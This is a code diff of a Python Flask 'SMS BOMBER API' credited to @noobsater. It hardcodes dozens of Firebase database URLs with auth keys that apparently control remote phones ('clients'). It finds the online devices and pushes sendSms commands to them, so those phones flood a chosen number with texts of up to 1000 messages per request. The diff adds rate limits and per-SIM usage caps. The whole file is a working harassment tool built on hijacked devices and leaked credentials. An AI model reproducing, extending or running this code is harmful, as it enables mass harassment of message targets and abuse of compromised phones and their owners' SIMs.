@@ -1,27 +1,66 @@
 #!/usr/bin/env python3
 """
-SMS BOMBER API - 100 REQUESTS = 100 DEVICES × BOTH SIMS
-NO LIMIT - Har device ke dono SIM use honge
+SMS BOMBER API - Render.com
+ALL 127+ Firebase - DDoS Protection + Rotate Devices + Status
 Developer: @noobsater
 """
 
 from flask import Flask, request, jsonify
+from functools import wraps
 import requests
 import json
 import time
 import random
 import re
-from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime, timedelta
+from collections import defaultdict
 import os
 
 app = Flask(__name__)
 
 # ============================================================
-# ===== ALL FIREBASE CONFIGURATIONS =====
+# ===== RATE LIMITING (DDoS Protection) =====
+# ============================================================
+
+RATE_LIMIT = {
+    'per_ip': 50,
+    'per_day': 500,
+}
+
+rate_data = defaultdict(lambda: {"hour": 0, "day": 0, "hour_reset": datetime.now(), "day_reset": datetime.now()})
+
+def rate_limit_check(ip):
+    now = datetime.now()
+    if now - rate_data[ip]["hour_reset"] > timedelta(hours=1):
+        rate_data[ip]["hour"] = 0
+        rate_data[ip]["hour_reset"] = now
+    if now - rate_data[ip]["day_reset"] > timedelta(days=1):
+        rate_data[ip]["day"] = 0
+        rate_data[ip]["day_reset"] = now
+    if rate_data[ip]["hour"] >= RATE_LIMIT['per_ip']:
+        return False, f"Hourly limit exceeded! Max {RATE_LIMIT['per_ip']} per hour"
+    if rate_data[ip]["day"] >= RATE_LIMIT['per_day']:
+        return False, f"Daily limit exceeded! Max {RATE_LIMIT['per_day']} per day"
+    rate_data[ip]["hour"] += 1
+    rate_data[ip]["day"] += 1
+    return True, "OK"
+
+def rate_limit(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        ip = request.remote_addr
+        allowed, msg = rate_limit_check(ip)
+        if not allowed:
+            return jsonify({"success": False, "error": msg}), 429
+        return f(*args, **kwargs)
+    return decorated
+
+# ============================================================
+# ===== ALL FIREBASE CONFIGURATIONS (127+) =====
 # ============================================================
 
 FIREBASE_CONFIGS = [
+    # ===== ASURPAPA wale =====
     {"name": "sex-panel", "url": "https://sex-panel-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
     {"name": "ritesh0001", "url": "https://ritesh0001-ea582-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
     {"name": "tika3", "url": "https://tika3-a400c-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
@@ -47,6 +86,8 @@ FIREBASE_CONFIGS = [
     {"name": "amirrr", "url": "https://amirrr-8a463-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
     {"name": "acchahi", "url": "https://acchahi-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
     {"name": "ankur", "url": "https://ankur-2511f-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
+    
+    # ===== Different Keys wale =====
     {"name": "ashu-415kumar", "url": "https://ashu-415kumar-default-rtdb.firebaseio.com", "auth": "1"},
     {"name": "adsf", "url": "https://adsf-8b4e8-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "1"},
     {"name": "surya", "url": "https://surya-917b9-default-rtdb.firebaseio.com", "auth": "Vo"},
@@ -72,6 +113,8 @@ FIREBASE_CONFIGS = [
     {"name": "jaduopop", "url": "https://jaduopop-a9a12-default-rtdb.firebaseio.com", "auth": "AIzaSyCfw-XX9NgbsUVCOP_GbxETXIY4AaH5b58"},
     {"name": "niggasionic", "url": "https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "Hah"},
     {"name": "burchanno", "url": "https://burchanno-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "Pp"},
+    
+    # ===== URL = Key wale (75+) =====
     {"name": "hood", "url": "https://hood-4ba1e-default-rtdb.firebaseio.com", "auth": "https://hood-4ba1e-default-rtdb.firebaseio.com"},
     {"name": "lucifer", "url": "https://lucifer-spreader-default-rtdb.firebaseio.com", "auth": "https://lucifer-spreader-default-rtdb.firebaseio.com"},
     {"name": "totla-axis", "url": "https://totla-axis-default-rtdb.firebaseio.com", "auth": "https://totla-axis-default-rtdb.firebaseio.com"},
@@ -163,37 +206,37 @@ FIREBASE_CONFIGS = [
 # ===== CONFIGURATION =====
 # ============================================================
 
-# NO LIMIT - Sab devices use honge
+MAX_SMS_PER_SIM = 100
+sim_usage = {}
 device_index = 0
 
 # ============================================================
 
-def safe_int(value):
-    if not value:
-        return 0
-    if isinstance(value, int):
-        return value
-    if isinstance(value, str):
-        cleaned = re.sub(r'[^0-9]', '', value)
-        try:
-            return int(cleaned) if cleaned else 0
-        except:
-            return 0
-    return 0
+def get_today():
+    return datetime.now().strftime("%Y-%m-%d")
+
+def can_send(device_id):
+    key = f"{device_id}_sim1_{get_today()}"
+    return sim_usage.get(key, 0) < MAX_SMS_PER_SIM
+
+def increment_usage(device_id):
+    key = f"{device_id}_sim1_{get_today()}"
+    sim_usage[key] = sim_usage.get(key, 0) + 1
 
 def is_online(info):
-    """Check if device is online"""
     if info.get('status') == True:
         return True
     battery = info.get('battery')
     if battery:
-        batt_int = safe_int(battery)
-        if batt_int > 0:
-            return True
+        try:
+            batt_int = int(str(battery).replace('%', ''))
+            if batt_int > 0:
+                return True
+        except:
+            pass
     return False
 
 def fetch_devices(config):
-    """Fetch ONLY online devices"""
     url = f"{config['url']}/clients.json?auth={config['auth']}"
     try:
         response = requests.get(url, timeout=10)
@@ -222,10 +265,10 @@ def fetch_all_devices():
     random.shuffle(all_devices)
     return all_devices
 
-def send_sms(config, client_id, to_number, message, sim=1):
+def send_sms(config, client_id, to_number, message):
     url = f"{config['url']}/clients/{client_id}/webhookEvent/sendSms.json?auth={config['auth']}"
     payload = {
-        "sim": sim,
+        "from": 1,
         "to": str(to_number),
         "message": str(message),
         "isSended": False
@@ -233,6 +276,7 @@ def send_sms(config, client_id, to_number, message, sim=1):
     try:
         response = requests.put(url, json=payload, timeout=10)
         if response.status_code in [200, 201, 204]:
+            increment_usage(client_id)
             return True
         return False
     except:
@@ -246,20 +290,20 @@ def send_sms(config, client_id, to_number, message, sim=1):
 def home():
     return f"""
 ╔═══════════════════════════════════════════════════════════╗
-║     🔥 SMS BOMBER API - ONLINE DEVICES ONLY            ║
-║     100 REQUESTS = 100 DEVICES × BOTH SIMs             ║
+║     🔥 SMS BOMBER API - {len(FIREBASE_CONFIGS)} FIREBASE DBs    ║
 ╠═══════════════════════════════════════════════════════════╣
 ║                                                         ║
 ║  📌 USAGE:                                             ║
 ║                                                         ║
-║  GET /send?number=9999999999&msg=Hello&count=10       ║
+║  GET /send?number=9999999999&msg=Hello&count=5        ║
 ║                                                         ║
 ║  📊 FEATURES:                                          ║
 ║                                                         ║
-║  ✅ ONLINE devices only                               ║
-║  ✅ Each request = NEW device                         ║
-║  ✅ Both SIMs (1 & 2) per device                     ║
-║  ✅ NO LIMIT - exhausted SIMs bhi use honge          ║
+║  ✅ {len(FIREBASE_CONFIGS)} Firebase Databases           ║
+║  ✅ Online devices only                                ║
+║  ✅ Rotate devices                                     ║
+║  ✅ {MAX_SMS_PER_SIM} SMS per SIM per day              ║
+║  ✅ DDoS Protection (50 req/hour)                     ║
 ║                                                         ║
 ╠═══════════════════════════════════════════════════════════╣
 ║  👨‍💻 Developer: @noobsater                              ║
@@ -271,16 +315,22 @@ def home():
 @app.route('/status')
 def status_api():
     all_devices = fetch_all_devices()
+    available = [d for d in all_devices if can_send(d['id'])]
     return jsonify({
         "success": True,
         "timestamp": datetime.now().isoformat(),
-        "online_devices": len(all_devices),
+        "total_online_devices": len(all_devices),
+        "available_devices": len(available),
+        "limit_per_sim": MAX_SMS_PER_SIM,
         "firebases": len(FIREBASE_CONFIGS),
+        "sim_usage": sim_usage,
+        "rate_limit": RATE_LIMIT,
         "developer": "@noobsater",
         "channel": "t.me/noob11001"
     })
 
 @app.route('/send')
+@rate_limit
 def send_sms_api():
     global device_index
     
@@ -291,9 +341,8 @@ def send_sms_api():
     if not number or not message:
         return jsonify({"success": False, "error": "Number and message required!"}), 400
     
-    max_count = min(count, 500)
+    max_count = min(count, 1000)
     
-    # Fetch ONLINE devices only
     all_devices = fetch_all_devices()
     
     if not all_devices:
@@ -303,31 +352,34 @@ def send_sms_api():
             "firebases": len(FIREBASE_CONFIGS)
         }), 404
     
-    sent, failed = 0, 0
+    sent = 0
+    failed = 0
     devices_used = []
     
-    # ===== ONE DEVICE PER SMS, BOTH SIMs =====
+    # Rotate and send
     for i in range(max_count):
-        # Rotate device
+        if sent >= max_count:
+            break
+        
+        # Rotate device index
         device_index = (device_index + 1) % len(all_devices)
         device = all_devices[device_index]
         
-        # Alternating SIMs: 1, 2, 1, 2, ...
-        sim = 1 if (i % 2 == 0) else 2
-        
-        success = send_sms(device['config'], device['id'], number, message, sim)
-        
-        if success:
-            sent += 1
-            devices_used.append({
-                "device": device['id'][:8],
-                "sim": sim,
-                "firebase": device['firebase']
-            })
+        # Check if SIM 1 available
+        if can_send(device['id']):
+            success = send_sms(device['config'], device['id'], number, message)
+            if success:
+                sent += 1
+                devices_used.append({
+                    "device": device['id'][:8],
+                    "firebase": device['firebase']
+                })
+            else:
+                failed += 1
         else:
-            failed += 1
+            continue
         
-        time.sleep(0.1)
+        time.sleep(0.05)
     
     return jsonify({
         "success": sent > 0,
@@ -336,9 +388,12 @@ def send_sms_api():
         "requested": max_count,
         "sent": sent,
         "failed": failed,
+        "total": sent + failed,
         "devices_used": devices_used,
-        "online_devices": len(all_devices),
+        "total_online_devices": len(all_devices),
+        "limit_per_sim": MAX_SMS_PER_SIM,
         "firebases": len(FIREBASE_CONFIGS),
+        "rate_limit": RATE_LIMIT,
         "developer": "@noobsater",
         "channel": "t.me/noob11001",
         "channel2": "t.me/noobsterrr"
@@ -346,22 +401,13 @@ def send_sms_api():
 
 @app.route('/reset')
 def reset_api():
-    global device_index
+    global sim_usage, device_index
+    sim_usage = {}
     device_index = 0
     return jsonify({
         "success": True,
-        "message": "Device index reset successfully!",
+        "message": "Reset successful!",
         "developer": "@noobsater"
-    })
-
-@app.route('/debug')
-def debug_api():
-    all_devices = fetch_all_devices()
-    return jsonify({
-        "success": True,
-        "online_devices": len(all_devices),
-        "sample_devices": all_devices[:20],
-        "firebases": len(FIREBASE_CONFIGS)
     })
 
 if __name__ == '__main__':
